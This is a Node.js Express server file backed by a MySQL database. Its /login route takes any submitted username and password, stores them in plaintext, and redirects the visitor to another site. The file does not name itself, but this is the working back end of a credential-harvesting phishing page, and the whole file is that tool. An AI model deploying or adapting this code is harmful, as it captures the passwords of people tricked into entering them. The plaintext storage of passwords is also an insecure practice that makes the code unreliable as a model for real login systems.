const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql');
const app = express();
const port = 80; // Change to port 80 for HTTP access

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Database setup
const db = mysql.createConnection({
    host: 'your-rds-endpoint', // Replace with your RDS endpoint
    user: 'your-username', // Replace with your RDS username
    password: 'your-password', // Replace with your RDS password
    database: 'your-database-name' // Replace with your RDS database name
});

db.connect(err => {
    if (err) {
        console.error('Database connection failed:', err.stack);
        return;
    }
    console.log('Connected to RDS MySQL database.');
});

// Create table if not exists
db.query('CREATE TABLE IF NOT EXISTS users (username VARCHAR(255), password VARCHAR(255))', (err, results, fields) => {
    if (err) {
        console.error(err.message);
    }
});

// Serve static files (HTML, CSS)
app.use(express.static('public'));

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Insert credentials into the database
    db.query('INSERT INTO users (username, password) VALUES (?, ?)', [username, password], (err, results, fields) => {
        if (err) {
            console.error(err.message);
        }
    });

    // Redirect to another website
    res.redirect('https://www.example.com'); // Change to the desired URL
});

// Start the server
app.listen(port, '0.0.0.0', () => {
    console.log(`Server running at http://localhost:${port}/`);
});
